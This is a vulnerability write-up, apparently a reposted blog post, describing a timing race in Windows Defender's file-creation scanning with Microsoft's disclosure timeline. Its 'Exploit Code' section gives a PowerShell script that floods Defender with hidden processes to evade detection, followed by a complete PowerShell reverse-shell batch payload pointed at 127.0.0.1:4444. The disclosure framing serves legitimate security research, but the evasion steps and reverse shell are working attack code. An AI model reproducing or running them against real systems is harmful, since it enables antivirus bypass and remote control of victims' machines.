# Exploiting a File Creation Detection Vulnerability in Windows Defender to Bypass Static Detection

**By Syed Sadam Hussain Shah**
*Originally published on Medium — Feb 12, 2025: [read it there](https://medium.com/@syedsadamsec/exploiting-file-creation-detection-vulnerabilities-in-windows-defender-to-bypass-static-detection-6cac059e9455)*

> **Note:** This write-up is published with Microsoft's approval.

---

Cybersecurity is an ever-evolving field where attackers and defenders continuously innovate to
outsmart one another. Recently, I discovered a vulnerability in Windows Defender's file creation
detection mechanism, which I subsequently reported. This post details the vulnerability, how it
works, and what it reveals about antivirus systems.

## Report Timeline

- **Vulnerability Submission:** January 10, 2025, 5:36 AM
- **Initial Response:** January 13, 2025 — Microsoft started the review process.
- **Second Response:** Microsoft raised questions about the Proof of Concept (PoC).
- **Final Response:** January 22, 2025 — Microsoft confirmed the vulnerability, decided not to
  address it since it did not affect runtime detection.

## Understanding the Vulnerability

The vulnerability exploits a race condition in Windows Defender's file creation detection
mechanism. By carefully timing file creation and overwhelming the antivirus engine with benign
processes, it is possible to bypass detection for malicious files.

## Steps to Reproduce

### Trigger Detection

1. Enable Windows Defender and open Notepad.
2. Write a simple malicious payload (e.g., a reverse shell script).
3. Save the file as `anything.bat` on the desktop. Windows Defender immediately flags and
   deletes it.

### Exploit the Race Condition

1. Disable Windows Defender temporarily.
2. Execute a PowerShell script (detailed below) to overwhelm Defender with benign processes.
3. Re-enable Windows Defender.
4. Save the same malicious payload as `anything.bat`. This time, Defender fails to detect and
   delete the file.

> **Note:** Restarting the machine resets Defender's state for further testing.

## Discovery and Analysis

Using Procmon, I monitored Windows Defender's core process (`MsMpEng.exe`) and observed that it
takes approximately **7 milliseconds** to detect a newly created file. This delay creates a
narrow window for bypassing detection by flooding the antivirus engine with benign processes.

## Exploit Code

### Step 1: Starting Benign Processes

This PowerShell function starts common Windows processes in hidden mode to avoid suspicion:

```powershell
function Start-BenignProcess {
   Start-Process "notepad.exe" -WindowStyle Hidden
   Start-Process "calc.exe" -WindowStyle Hidden
   Start-Process "cmd.exe" -WindowStyle Hidden
}
```

### Step 2: Creating a Process Flood

The script spawns 58 concurrent jobs running the `Start-BenignProcess` function to overwhelm
Defender's detection engine:

```powershell
$threads = @()
for ($i = 1; $i -lt 59; $i++) {
   $threads += Start-Job -ScriptBlock { Start-BenignProcess }
}
```

### Step 3: Timing the Detection Delay

To align with the 7-millisecond detection gap, the script introduces a short delay:

```powershell
Start-Sleep -Milliseconds 7
```

### Step 4: Completing the Flood

The script ensures all jobs complete execution:

```powershell
$threads | ForEach-Object { Wait-Job -Job $_ }
Write-Output "All threads executed."
```

### Step 5: Injecting the Malicious Payload

During the detection delay caused by the benign process flood, the following malicious payload
can be written to disk:

```bat
@echo off
set IP=127.0.0.1
set PORT=4444
:RECONNECT
powershell -NoP -NonI -W Hidden -Command "
$client = New-Object System.Net.Sockets.TCPClient('%IP%',%PORT%');
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
  $data = [System.Text.Encoding]::ASCII.GetString($buffer,0,$i);
  $sendback = (Invoke-Expression -Command $data 2>&1) | Out-String;
  $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()"
goto RECONNECT
```

## Implications of the Vulnerability

Separating scan-time and runtime detection creates opportunities for adversaries to bypass
defenses during file creation. This vulnerability demonstrates the need for tighter integration
between scan-time and runtime detection mechanisms to close such gaps.

## Final Thoughts

This research highlights the importance of scrutinizing every phase of antivirus functionality.
Even seemingly minor delays can be exploited under the right conditions.

As a security researcher, my goal is to identify and report vulnerabilities to improve the
resilience of security tools. I look forward to continuing this journey and contributing to a
safer digital ecosystem.

## Disclaimer

This research is intended for educational purposes only. Misuse of these techniques is illegal
and unethical. Always adhere to ethical guidelines and applicable laws.

---

**Author:** Syed Sadam Hussain Shah
**Connect:** [LinkedIn](https://qa.linkedin.com/in/syed-sadam-h-950a62336)
